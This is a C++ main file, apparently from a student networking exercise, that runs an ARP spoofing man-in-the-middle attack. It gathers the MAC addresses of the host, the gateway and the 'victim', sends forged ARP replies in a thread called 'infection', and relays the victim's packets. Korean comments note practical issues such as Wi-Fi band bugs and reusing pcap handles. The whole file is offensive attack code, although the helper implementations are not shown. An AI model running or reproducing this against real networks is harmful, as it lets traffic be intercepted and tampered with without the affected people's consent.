#include <iostream>
#include <pcap.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include "parse_data.h"
#include "parse_data_in_linux.h"
#include "get_gateway_data.h"
#include "get_target_data.h"
#include "make_send_reply_packet.h"
#include "replay_normal_packet.h"

using namespace std;

//READ ME
//attacker =  my pc
//target   =  victim
//gateway  =  gateway

// why? -> Desktop이 연결된 공유기가 3g와 5g의 랜카드가 들어있는데
// 그 공유기에 연결된 데스크탑이 3g로 하는지 5g로 하는지 판단 어떻게? 3g로 데스크탑에 스푸핑을 걸면 버그가 생길때가 있음

//pcap 핸들을 마음대로 닫아버리고 다시열개되면
//그 짧은사이에 응답패킷을 받지못하는거같음 그러므로 패킷을 보내고 바로 받을때에는
//같은 핸들로 open~ 보내고 받자!(pcap_t *)

// in pcap_open_live ->> promiscuous mode !!
// 1 is on  >> all local packets capture
//0 is off >> Packets destined only to you

int main(int argc, char *argv[])
{
    parse_data parse(argc,argv);
    parse_data_in_linux(&parse); //get host mac & ip
    get_gateway_data(&parse);    //get gateway mac
    get_target_data(&parse);     //get target mac
    make_send_reply_packet(&parse); //send ARP reply to target
    thread infection(&send_reply_arp,parse.using_send_arp_reply_pcaphandle(),parse.using_send_arp_reply_packet(),parse.using_send_arp_reply_length());
    //replay come on
    replay_normal_packet(&parse,parse.using_send_arp_reply_pcaphandle());
    infection.join();
    pcap_close(parse.using_send_arp_reply_pcaphandle());
    return 0;
}
